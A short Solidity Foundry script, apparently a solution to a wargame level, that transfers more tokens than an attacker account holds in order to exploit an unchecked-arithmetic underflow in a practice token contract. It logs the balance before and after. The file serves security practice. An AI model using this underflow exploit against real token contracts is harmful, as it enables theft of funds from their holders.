// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast_6.sol";
import {Token} from "../src/L5Token.sol";

contract L5TokenAttack is Script, Broadcast {
    Token token = Token(0x6F1216D1BFe15c98520CA1434FC1d9D57AC95321);
    address constant ATTACKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address constant PLAYER2 = 0x86E26DC295d7c11FF54a39aA3420E3F163581D0c;

    function run() public broadcast {
        console.log("Before:", token.balanceOf(ATTACKER));
        token.transfer(PLAYER2, 21);
        console.log("After:", token.balanceOf(ATTACKER));
    }
}
